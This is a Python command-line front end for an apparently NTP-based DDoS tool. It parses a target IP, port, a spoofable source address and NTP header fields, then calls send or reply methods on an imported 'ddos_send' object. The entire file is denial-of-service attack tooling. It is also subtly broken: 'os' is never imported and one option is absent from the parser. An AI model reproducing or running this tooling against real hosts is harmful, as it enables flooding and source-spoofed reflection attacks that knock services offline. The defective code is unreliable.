import getopt
import sys
from ddosMain import ddos_send

def usage():
    print("""###[ NTPHeader ]###
        version= 4
        mode= client
        stratum= 2
        id= 127.0.0.1

        -t 1 send_ddos_packet
        -t 2 reply_ddos_packet

        -d dst ip
        -p port
        -a source address
        """)

    '''
        poll= 10
        precision= 0
        delay= 0.0
        dispersion= 0.0
        ref= 0.0
        orig= Wed, 18 Mar 2020 09:59:30 +0000
        recv= 0.0
        sent= Wed, 18 Mar 2020 09:59:30 +0000
    '''
    
def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "v:m:s:i:ht:d:p:a:", ["version", "mode", "stratum", "id", "help", "type", "dst", "port","srcaddress" ])
    except getopt.GetoptError as err:
        usage()
        sys.exit(2)
    d = {}
    method = "send_ntp_packet" 
    address = os.environ.get('tdip')
    port = os.environ.get("tport") 
    source_addr = None

    for key, value in opts:
        if key in ("-h", "--help"):
            usage()
            sys.exit(1)
        if key in ("-t", "--type"):
            if(value== "1"):
                method = "send_ntp_packet"
            elif(value== "2"):
                method = "reply_ntp_packet"

        elif key in ("-v", "--version"):
            d["version"] = int(value);
        elif key in ("-d", "--dst"):
            address = value
        elif key in ("-p", "--port"):
            port = value 
        elif key in ("-m", "--mode"):
            d["mode"] = int(value);
        elif key in ("-s", "--stratum"):
            d["stratum"] = int(value);
        elif key in ("-a", "--srcaddress"):
            source_addr = value 
        elif key in ("-i", "--id"):
            d["id"] = value;
        elif key in ("-da", "--data"):
            d["data"] = "a" *int(value);
        else:
            assert False, "option error"
    data = {
            "address":address,
            "port": port,
            "method": method,
            "ntpinfo":d,
            "srcaddress": source_addr
            }

    return data

        
if __name__ == "__main__":
    data = main() 
    dst = data["address"]
    port = data["port"]
    method = data["method"]
    ntpinfo = data["ntpinfo"]
    srcaddr = data["srcaddress"]

    print(port, dst, method, ntpinfo)

    obj = ddos_send(port, dst, srcaddr)
    getattr(obj, method)(ntpinfo)


